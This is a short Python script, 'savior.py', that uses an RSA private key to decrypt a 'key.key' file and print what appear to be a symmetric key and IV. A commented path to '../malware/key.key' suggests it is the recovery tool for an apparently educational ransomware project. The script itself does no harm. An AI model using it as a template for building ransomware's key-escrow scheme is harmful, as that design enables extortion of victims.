#!/bin/env python3

import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes

# KEY = '../malware/key.key'
KEY = 'key.key'

def decrypt_keys(key):
    private_key = serialization.load_pem_private_key(
        key.encode(),
        password=None,
        backend=default_backend()
    )

    with open(KEY, 'r') as key_file:
        content = bytes.fromhex(key_file.read())
        data = private_key.decrypt(
            content,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        data = str(data, 'utf-8').split()
        if len(data) != 2:
            print('Something went wrong')
            exit()

    return data

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('USAGE: ./savior.py [PATH/TO/PRIVATEKEY.PEM]')
        exit()

    private_key_file = sys.argv[1]
    if not private_key_file.endswith('.pem'):
        print('Invalid private key file.')
        exit()

    with open(private_key_file, 'r') as pk_f:
        private_key = pk_f.read()
    (key_iv) = decrypt_keys(private_key)
    print(f"{key_iv[0]} {key_iv[1]}")
